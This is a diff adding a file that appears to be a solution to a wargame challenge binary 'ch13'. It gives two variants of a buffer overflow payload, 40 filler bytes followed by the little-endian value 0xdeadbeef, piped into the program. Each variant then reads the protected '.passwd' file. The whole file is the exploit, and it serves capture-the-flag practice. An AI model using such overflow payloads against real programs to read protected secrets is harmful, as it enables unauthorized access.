@@ -1,0 +1,9 @@
+( python -c 'print("A"*40 + "\xef\xbe\xad\xde")' && cat ) | ./ch13
+cat .passwd
+
+or
+
+echo $'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\xaf'
+./ch13
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭޯ
+cat .passwd
